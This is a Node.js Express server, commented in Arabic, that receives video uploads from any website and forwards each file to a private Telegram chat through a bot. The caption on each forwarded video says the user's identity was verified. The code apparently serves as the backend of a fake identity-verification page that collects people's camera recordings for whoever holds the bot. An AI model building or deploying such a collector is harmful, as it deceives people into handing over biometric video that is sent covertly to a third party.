const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================
// 0. إعدادات إضافية
// ============================================
const TEMP_DIR = process.env.TEMP_DIR || './uploads/temp/';

// التأكد من وجود المجلد
if (!fs.existsSync(TEMP_DIR)) {
  fs.mkdirSync(TEMP_DIR, { recursive: true });
}

// معالجة الأخطاء العالمية
process.on('uncaughtException', (error) => {
  console.error('❌ خطأ غير متوقع:', error);
});

process.on('unhandledRejection', (error) => {
  console.error('❌ خطأ في الـ Promise:', error);
});

// إضافة middleware للتسجيل و CORS
app.use((req, res, next) => {
  console.log(`📝 ${req.method} ${req.url}`);
  // إضافة CORS للسماح بالطلبات من أي مصدر
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ============================================
// 1. إعداد Multer
// ============================================
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, TEMP_DIR);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    const ext = path.extname(file.originalname);
    cb(null, `input-${uniqueSuffix}${ext}`);
  }
});

const upload = multer({
  storage: storage,
  limits: {
    fileSize: 50 * 1024 * 1024 // 50 ميجابايت
  },
  fileFilter: (req, file, cb) => {
    if (file.mimetype.startsWith('video/')) {
      cb(null, true);
    } else {
      cb(new Error('نوع الملف غير مدعوم. يرجى رفع فيديو فقط.'));
    }
  }
});

// ============================================
// 2. دالة إرسال الفيديو إلى تيليجرام (بدون تحويل)
// ============================================
async function sendVideoToTelegram(filePath, fileName) {
  try {
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      throw new Error('التوكن أو الـ Chat ID غير موجود في ملف .env');
    }

    console.log('📤 جاري إرسال الفيديو إلى تيليجرام...');
    console.log(`   - الملف: ${filePath}`);
    console.log(`   - الحجم: ${(fs.statSync(filePath).size / 1024 / 1024).toFixed(2)} MB`);

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', fs.createReadStream(filePath));
    formData.append('caption', '✅ تم التحقق من هويتك بنجاح! 🎥');
    formData.append('supports_streaming', 'true');

    const response = await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
      formData,
      {
        headers: {
          ...formData.getHeaders()
        },
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
        timeout: 60000
      }
    );

    console.log('✅ تم إرسال الفيديو إلى تيليجرام بنجاح!');
    console.log(`   - Message ID: ${response.data.result.message_id}`);
    console.log(`   - File ID: ${response.data.result.video.file_id}`);
    
    return response.data;

  } catch (error) {
    console.error('❌ فشل إرسال الفيديو إلى تيليجرام:');
    if (error.response) {
      console.error('   - الرد:', JSON.stringify(error.response.data, null, 2));
    } else {
      console.error('   - الخطأ:', error.message);
    }
    throw error;
  }
}

// ============================================
// 3. دالة حذف الملفات المؤقتة
// ============================================
function deleteTempFiles(filePaths) {
  if (!Array.isArray(filePaths)) {
    filePaths = [filePaths];
  }

  filePaths.forEach(filePath => {
    try {
      if (filePath && fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
        console.log('🗑️ تم حذف الملف المؤقت:', path.basename(filePath));
      }
    } catch (error) {
      console.warn('⚠️ تعذر حذف الملف المؤقت:', error.message);
    }
  });
}

// ============================================
// 4. نقطة نهاية استقبال الفيديو
// ============================================
app.post("/upload", upload.single("video"), async (req, res) => {
  console.log('📹 POST /upload received');
  console.log('========================================');

  let inputPath = null;

  try {
    if (!req.file) {
      console.error('❌ لا يوجد ملف في الطلب');
      return res.status(400).json({
        success: false,
        message: "لم يتم استلام فيديو. تأكد من إرسال حقل باسم 'video'"
      });
    }

    inputPath = req.file.path;
    const fileSize = (req.file.size / 1024 / 1024).toFixed(2);

    console.log('📁 معلومات الفيديو المستقبل:');
    console.log(`   - الاسم: ${req.file.originalname}`);
    console.log(`   - الحجم: ${fileSize} MB`);
    console.log(`   - النوع: ${req.file.mimetype}`);
    console.log(`   - المسار: ${inputPath}`);
    console.log('ℹ️ سيتم إرسال الفيديو بصيغته الأصلية بدون تحويل');

    // إرسال الفيديو إلى تيليجرام
    const result = await sendVideoToTelegram(inputPath, req.file.originalname);

    // حذف الملف المؤقت
    deleteTempFiles([inputPath]);

    res.status(200).json({
      success: true,
      message: "✅ تم استلام الفيديو وإرساله إلى تيليجرام بنجاح",
      data: {
        original_filename: req.file.originalname,
        original_size: `${fileSize} MB`,
        telegram: {
          message_id: result.result.message_id,
          file_id: result.result.video.file_id
        }
      }
    });

  } catch (error) {
    console.error('❌ خطأ:', error);
    
    if (inputPath) {
      deleteTempFiles([inputPath]);
    }

    res.status(500).json({
      success: false,
      message: "حدث خطأ أثناء معالجة الفيديو",
      error: error.message
    });
  }
});

// ============================================
// 5. نقطة نهاية لاختبار البوت
// ============================================
app.get("/test-bot", async (req, res) => {
  try {
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(400).json({
        success: false,
        message: "التوكن أو الـ Chat ID غير موجود في ملف .env"
      });
    }

    const response = await axios.get(
      `https://api.telegram.org/bot${BOT_TOKEN}/getMe`
    );

    res.json({
      success: true,
      message: "✅ البوت يعمل بشكل صحيح",
      bot: response.data.result,
      config: {
        bot_token: BOT_TOKEN ? 'موجود ✅' : 'غير موجود ❌',
        chat_id: CHAT_ID ? 'موجود ✅' : 'غير موجود ❌',
        temp_dir: TEMP_DIR,
        node_version: process.version
      }
    });

  } catch (error) {
    res.status(500).json({
      success: false,
      message: "❌ فشل الاتصال بالبوت",
      error: error.message
    });
  }
});

// ============================================
// 6. صفحة رئيسية
// ============================================
app.use(express.static(__dirname));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ============================================
// 7. تشغيل الخادم
// ============================================
app.listen(PORT, '0.0.0.0', () => {
  console.log('========================================');
  console.log(`🚀 الخادم يعمل على http://0.0.0.0:${PORT}`);
  console.log('========================================');
  console.log('📋 إعدادات البوت:');
  console.log(`   - التوكن: ${process.env.BOT_TOKEN ? '✅ موجود' : '❌ غير موجود'}`);
  console.log(`   - Chat ID: ${process.env.CHAT_ID ? '✅ موجود' : '❌ غير موجود'}`);
  console.log(`   - مجلد مؤقت: ${TEMP_DIR}`);
  console.log('========================================');
  console.log('📤 نقاط النهاية:');
  console.log(`   POST http://localhost:${PORT}/upload - رفع فيديو`);
  console.log(`   GET  http://localhost:${PORT}/test-bot - اختبار البوت`);
  console.log(`   GET  http://localhost:${PORT}/ - الصفحة الرئيسية`);
  console.log('========================================');
  console.log('⚠️ تحويل الفيديو: معطل (يرسل بصيغته الأصلية)');
  console.log('========================================');
});
